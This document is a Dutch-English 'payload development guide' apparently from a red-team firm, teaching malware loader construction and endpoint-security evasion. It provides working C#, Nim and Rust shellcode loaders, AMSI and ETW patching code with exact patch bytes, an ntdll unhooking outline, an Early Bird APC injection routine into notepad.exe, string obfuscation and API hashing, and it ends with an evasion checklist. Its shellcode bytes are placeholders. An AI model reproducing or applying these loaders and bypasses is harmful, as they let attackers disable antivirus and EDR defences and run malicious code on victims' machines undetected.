# XPOSE SECURITY — PAYLOAD DEVELOPMENT GUIDE
## Custom Loaders, EDR Bypass & Evasion Techniques

**Classificatie:** STRIKT VERTROUWELIJK  
**Versie:** 1.0 | Januari 2026

---

# 1. EVASION FUNDAMENTALS

## 1.1 Detection Mechanisms

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    HOW EDR/AV DETECTS MALWARE                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. STATIC ANALYSIS (File on disk)                                         │
│     • Signature matching (hash, byte patterns)                             │
│     • Heuristics (suspicious imports, strings)                             │
│     • Machine learning on file features                                    │
│     → BYPASS: Encryption, obfuscation, packing                            │
│                                                                             │
│  2. DYNAMIC ANALYSIS (Runtime)                                              │
│     • API hooking (monitor suspicious calls)                               │
│     • ETW (Event Tracing for Windows)                                      │
│     • AMSI (Antimalware Scan Interface)                                    │
│     → BYPASS: Unhooking, direct syscalls, AMSI bypass                     │
│                                                                             │
│  3. BEHAVIORAL ANALYSIS                                                     │
│     • Process injection detection                                          │
│     • Memory allocation patterns                                           │
│     • Network connections                                                   │
│     → BYPASS: Legitimate process mimicry, staging                         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

> **📘 UITLEG:**
> Moderne EDR detecteert op 3 niveaus:
> - **Static:** Bestand scannen voor signatures
> - **Dynamic:** Runtime gedrag monitoren
> - **Behavioral:** Patronen over tijd analyseren
>
> Effectieve evasion vereist bypass op alle 3 niveaus.

---

# 2. SHELLCODE LOADERS

## 2.1 Basic C# Loader

```csharp
// BasicLoader.cs
// Compile: csc /unsafe /out:loader.exe BasicLoader.cs

using System;
using System.Runtime.InteropServices;

namespace Loader
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        static void Main(string[] args)
        {
            // XOR encrypted shellcode (encrypt your actual shellcode)
            byte[] buf = new byte[] { 0x90, 0x90, 0x90 }; // Replace with shellcode
            byte xorKey = 0x41;
            
            // Decrypt shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ xorKey);
            }
            
            // Allocate memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            
            // Copy shellcode to allocated memory
            Marshal.Copy(buf, 0, addr, buf.Length);
            
            // Create thread to execute shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            
            // Wait for thread
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

> **📘 UITLEG:**
> **Basic loader flow:**
> 1. Decrypt shellcode (XOR)
> 2. VirtualAlloc - Alloceer geheugen met RWX permissions
> 3. Marshal.Copy - Kopieer shellcode naar geheugen
> 4. CreateThread - Start execution
>
> **Detectie risico:** HOOG
> - VirtualAlloc met PAGE_EXECUTE_READWRITE (0x40) is verdacht
> - CreateThread naar non-module memory is verdacht
> - Direct syscalls en staged approach nodig voor evasion

---

## 2.2 Nim Loader (Recommended)

```nim
# loader.nim
# Compile: nim c -d:release -d:strip --opt:size loader.nim

import winim/lean
import strutils

proc xorDecrypt(data: var seq[byte], key: byte) =
  for i in 0..<data.len:
    data[i] = data[i] xor key

proc main() =
  # XOR encrypted shellcode
  var shellcode: seq[byte] = @[byte 0x90, 0x90, 0x90]  # Replace
  let key: byte = 0x41
  
  # Decrypt
  xorDecrypt(shellcode, key)
  
  # Allocate memory - RW first, then change to RX
  let mem = VirtualAlloc(
    nil,
    cast[SIZE_T](shellcode.len),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_READWRITE  # RW, not RWX
  )
  
  # Copy shellcode
  copyMem(mem, addr shellcode[0], shellcode.len)
  
  # Change protection to RX
  var oldProtect: DWORD
  VirtualProtect(mem, cast[SIZE_T](shellcode.len), PAGE_EXECUTE_READ, addr oldProtect)
  
  # Execute via callback function
  let callback = cast[proc() {.stdcall.}](mem)
  callback()

when isMainModule:
  main()
```

> **📘 UITLEG:**
> **Nim voordelen voor malware development:**
> - Compileert naar native code (geen .NET runtime)
> - Kleine binary size
> - Minder common = minder signatures
> - Python-achtige syntax
>
> **Evasion improvements:**
> - RW allocation, then RX (niet direct RWX)
> - Callback execution i.p.v. CreateThread

---

## 2.3 Rust Loader (Most Stealthy)

```rust
// loader.rs
// Compile: cargo build --release

use std::ptr::null_mut;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};

fn xor_decrypt(data: &mut [u8], key: u8) {
    for byte in data.iter_mut() {
        *byte ^= key;
    }
}

fn main() {
    // XOR encrypted shellcode
    let mut shellcode: Vec<u8> = vec![0x90, 0x90, 0x90]; // Replace
    let key: u8 = 0x41;
    
    // Decrypt
    xor_decrypt(&mut shellcode, key);
    
    unsafe {
        // Allocate RW memory
        let mem = VirtualAlloc(
            null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        
        // Copy shellcode
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            mem as *mut u8,
            shellcode.len(),
        );
        
        // Change to RX
        let mut old_protect = 0u32;
        VirtualProtect(
            mem,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );
        
        // Execute
        let func: extern "C" fn() = std::mem::transmute(mem);
        func();
    }
}
```

> **📘 UITLEG:**
> **Rust voordelen:**
> - Geen runtime dependencies
> - Memory safe (compiler catches bugs)
> - Zeer kleine binaries mogelijk
> - Minst gedetecteerd door AV/EDR (nog)

---

# 3. ADVANCED EVASION TECHNIQUES

## 3.1 Direct Syscalls

```csharp
// Direct syscall bypasses user-mode hooks
// Syscall number for NtAllocateVirtualMemory varies per Windows version

using System;
using System.Runtime.InteropServices;

public class DirectSyscall
{
    // Windows 10 21H2 syscall numbers (varies by version!)
    private const int NtAllocateVirtualMemory = 0x18;
    private const int NtWriteVirtualMemory = 0x3A;
    private const int NtCreateThreadEx = 0xC7;
    
    [DllImport("ntdll.dll")]
    private static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );
    
    // Alternative: Use inline assembly or D/Invoke to make direct syscalls
    // This bypasses ntdll.dll hooks entirely
}
```

> **📘 UITLEG:**
> **Direct syscalls bypass EDR hooks:**
>
> Normal flow (hooked):
> ```
> Your Code → kernel32.dll → ntdll.dll (HOOKED) → Kernel
> ```
>
> Direct syscall:
> ```
> Your Code → syscall instruction → Kernel
> ```
>
> **Waarom effectief:** EDR hooks ntdll.dll functies, direct syscalls omzeilen dit.

---

## 3.2 AMSI Bypass

```powershell
# AMSI Bypass - Patch AmsiScanBuffer to always return clean

# Method 1: Reflection (may be flagged)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Memory patching (more reliable)
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like "*Am*ils*"}
$f = $a.GetFields('NonPublic,Static') | ?{$_.Name -like "*ailed*"}
$f.SetValue($null,$true)
```

```csharp
// C# AMSI Bypass - Patch AmsiScanBuffer
using System;
using System.Runtime.InteropServices;

public class AmsiBypass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        // Get address of AmsiScanBuffer
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");
        
        // Patch bytes - make function return immediately with AMSI_RESULT_CLEAN
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
        
        // Change memory protection
        uint oldProtect;
        VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);
        
        // Write patch
        Marshal.Copy(patch, 0, asb, patch.Length);
        
        // Restore protection
        VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
}
```

> **📘 UITLEG:**
> **AMSI (Antimalware Scan Interface):**
> - PowerShell, .NET, VBScript sturen code naar AMSI voor scanning
> - EDR/Defender krijgt code te zien VOOR execution
>
> **Bypass:** Patch AmsiScanBuffer om altijd "clean" te retourneren
>
> **Let op:** AMSI bypass zelf kan gedetecteerd worden!

---

## 3.3 ETW Bypass

```csharp
// ETW Bypass - Patch EtwEventWrite to disable telemetry

using System;
using System.Runtime.InteropServices;

public class EtwBypass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        // Get address of EtwEventWrite
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr eew = GetProcAddress(ntdll, "EtwEventWrite");
        
        // Patch to return immediately
        byte[] patch = { 0xC3 }; // ret
        
        uint oldProtect;
        VirtualProtect(eew, (UIntPtr)patch.Length, 0x40, out oldProtect);
        Marshal.Copy(patch, 0, eew, patch.Length);
        VirtualProtect(eew, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
}
```

> **📘 UITLEG:**
> **ETW (Event Tracing for Windows):**
> - Windows telemetry systeem
> - EDR gebruikt ETW voor visibility
> - Patchen van EtwEventWrite blokkeert veel telemetry
>
> **Effect:** .NET events, process events, network events worden niet gelogd

---

## 3.4 Unhooking ntdll.dll

```csharp
// Unhook ntdll.dll by replacing with clean copy from disk

using System;
using System.IO;
using System.Runtime.InteropServices;

public class Unhooker
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);

    public static void UnhookNtdll()
    {
        // Read clean ntdll from disk
        byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
        
        // Get loaded ntdll base address
        IntPtr loadedNtdll = GetModuleHandle("ntdll.dll");
        
        // Parse PE headers to find .text section
        // Copy clean .text section over hooked one
        // (Implementation requires PE parsing - simplified here)
        
        // This replaces hooked functions with clean originals
    }
}
```

> **📘 UITLEG:**
> **Unhooking concept:**
> - EDR patches ntdll.dll in memory met JMP hooks
> - Originele ntdll.dll op disk is niet gehooked
> - Kopieer clean .text section over hooked version
>
> **Resultaat:** Alle hooks verwijderd, EDR ziet niets

---

# 4. PROCESS INJECTION TECHNIQUES

## 4.1 Process Injection Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    PROCESS INJECTION TECHNIQUES                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  CLASSIC (Heavily detected):                                                │
│  • CreateRemoteThread                                                       │
│  • NtQueueApcThread                                                         │
│  • WriteProcessMemory + CreateRemoteThread                                  │
│                                                                             │
│  MODERATE DETECTION:                                                        │
│  • Process Hollowing                                                        │
│  • Thread Hijacking                                                         │
│  • DLL Injection                                                            │
│                                                                             │
│  LOWER DETECTION:                                                           │
│  • Early Bird Injection                                                     │
│  • Module Stomping                                                          │
│  • Phantom DLL Hollowing                                                    │
│  • Process Doppelganging                                                    │
│                                                                             │
│  ADVANCED:                                                                   │
│  • Transacted Hollowing                                                     │
│  • ThreadLocalStorageCallback                                               │
│  • Hardware Breakpoint Injection                                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 4.2 Early Bird Injection (Nim)

```nim
# Early Bird Injection - Inject before process fully initializes
import winim/lean
import os

proc earlyBirdInject(shellcode: var seq[byte], targetPath: string) =
  var 
    si: STARTUPINFOA
    pi: PROCESS_INFORMATION
  
  # Create process in suspended state
  if CreateProcessA(
    targetPath,
    nil,
    nil,
    nil,
    FALSE,
    CREATE_SUSPENDED,
    nil,
    nil,
    addr si,
    addr pi
  ) == 0:
    echo "[-] CreateProcess failed"
    return
  
  echo "[+] Created suspended process: ", pi.dwProcessId
  
  # Allocate memory in target
  let remoteMem = VirtualAllocEx(
    pi.hProcess,
    nil,
    cast[SIZE_T](shellcode.len),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_READWRITE
  )
  
  # Write shellcode
  var bytesWritten: SIZE_T
  WriteProcessMemory(
    pi.hProcess,
    remoteMem,
    addr shellcode[0],
    cast[SIZE_T](shellcode.len),
    addr bytesWritten
  )
  
  # Change to RX
  var oldProtect: DWORD
  VirtualProtectEx(
    pi.hProcess,
    remoteMem,
    cast[SIZE_T](shellcode.len),
    PAGE_EXECUTE_READ,
    addr oldProtect
  )
  
  # Queue APC to main thread (will execute before main)
  QueueUserAPC(
    cast[PAPCFUNC](remoteMem),
    pi.hThread,
    0
  )
  
  # Resume thread - APC executes first!
  ResumeThread(pi.hThread)
  
  echo "[+] Early Bird injection complete"

when isMainModule:
  var shellcode: seq[byte] = @[byte 0x90, 0x90]  # Replace
  earlyBirdInject(shellcode, "C:\\Windows\\System32\\notepad.exe")
```

> **📘 UITLEG:**
> **Early Bird Injection:**
> 1. Start process in SUSPENDED state
> 2. Allocate memory en write shellcode
> 3. Queue APC (Asynchronous Procedure Call)
> 4. Resume process
> 5. APC executeert VOOR main code van process
>
> **Waarom effectief:** 
> - EDR verwacht geen code execution in suspended process
> - APC is legitiem Windows mechanisme

---

# 5. OBFUSCATION TECHNIQUES

## 5.1 String Obfuscation

```csharp
// Compile-time string encryption

public static class StringObfuscator
{
    // XOR with random key
    public static string Deobfuscate(byte[] encrypted, byte key)
    {
        byte[] decrypted = new byte[encrypted.Length];
        for (int i = 0; i < encrypted.Length; i++)
        {
            decrypted[i] = (byte)(encrypted[i] ^ key);
        }
        return System.Text.Encoding.ASCII.GetString(decrypted);
    }
}

// Usage:
// Instead of: string s = "VirtualAlloc";
// Use: string s = StringObfuscator.Deobfuscate(new byte[] { 0x37, 0x2a, ... }, 0x41);
```

## 5.2 API Hashing

```csharp
// API Hashing - Resolve function names at runtime via hash

public static class ApiHashing
{
    // DJB2 hash algorithm
    public static uint Hash(string name)
    {
        uint hash = 5381;
        foreach (char c in name)
        {
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }
    
    // VirtualAlloc hash = 0x91AFCA54
    // GetProcAddress hash = 0x7C0DFCAA
    
    // Resolve function by hash at runtime
    // This avoids suspicious imports in IAT
}
```

> **📘 UITLEG:**
> **API hashing voorkomt:**
> - Static analysis van Import Address Table
> - String-based detection
>
> **Implementatie:**
> - Hash alle functienamen compile-time
> - Resolve functies runtime via GetProcAddress
> - Match hash tegen export table

---

# 6. PAYLOAD DEVELOPMENT CHECKLIST

```
═══════════════════════════════════════════════════════════════════════════════
                    PAYLOAD DEVELOPMENT CHECKLIST
═══════════════════════════════════════════════════════════════════════════════

PRE-DEVELOPMENT:
☐ Target environment geïdentificeerd (Windows version, EDR)
☐ Detection baseline vastgesteld
☐ Development environment isolated

STATIC EVASION:
☐ Shellcode encrypted (AES/XOR)
☐ Strings obfuscated
☐ API hashing implemented
☐ No suspicious imports
☐ Binary signed (if possible)
☐ Rich header removed/spoofed
☐ Compile optimizations enabled

RUNTIME EVASION:
☐ AMSI bypass implemented
☐ ETW bypass implemented
☐ Direct syscalls or unhooking
☐ RW → RX memory pattern (not RWX)
☐ Sleep/delay before execution
☐ Sandbox detection (optional)

BEHAVIORAL EVASION:
☐ Injection into legitimate process
☐ Execution during business hours
☐ No suspicious parent-child relationships
☐ Minimal network indicators

TESTING:
☐ Tested against Windows Defender
☐ Tested against target EDR (if known)
☐ Tested in similar environment
☐ Fallback payload ready

═══════════════════════════════════════════════════════════════════════════════
```

---

**EINDE PAYLOAD DEVELOPMENT GUIDE**

